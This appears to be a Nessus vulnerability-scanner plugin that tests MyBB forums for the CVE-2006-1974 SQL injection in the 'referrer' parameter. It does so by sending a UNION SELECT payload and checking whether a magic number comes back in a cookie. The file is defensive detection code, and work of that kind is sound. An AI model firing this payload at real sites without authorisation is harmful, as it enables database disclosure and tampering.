#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(20838);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-1974");
  script_bugtraq_id(16443);
  script_xref(name:"OSVDB", value:"25672");

  script_name(english:"MyBB index.php referrer Parameter SQL Injection");
  script_summary(english:"Checks for referrer parameter SQL injection vulnerability in MyBB");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is vulnerable to SQL
attacks." );
 script_set_attribute(attribute:"description", value:
"The installed version of MyBB fails to validate user input to the
'referrer' parameter before using it in the 'globals.php' script to
construct database queries.  An unauthenticated attacker can leverage
this issue to disclose sensitive information, modify data, or launch
attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=6777" );
 script_set_attribute(attribute:"solution", value:
"Edit 'inc/settings.php' and set 'usereferrals' to 'no'. Or upgrade to
MyBB version 1.0.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


magic = rand();
exploit = string("UNION SELECT ", magic,  ",2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9--");


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  init_cookiejar();
  dir = matches[2];

  val = get_http_cookie(name: "mybb[referrer]");
  if (val == magic) clear_cookiejar();

  # Try to exploit flaw.
  r = http_send_recv3(method: "GET", 
    item:string(
      dir, "/index.php?",
      "referrer=", rand() % 100, "'+", urlencode(str:exploit)
    ), 
    port:port
  );
  if (isnull(r)) exit(0);

  # There's a problem if we see our magic number in the referrer cookie.
  val = get_http_cookie(name: "mybb[referrer]");
  if (val == magic) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
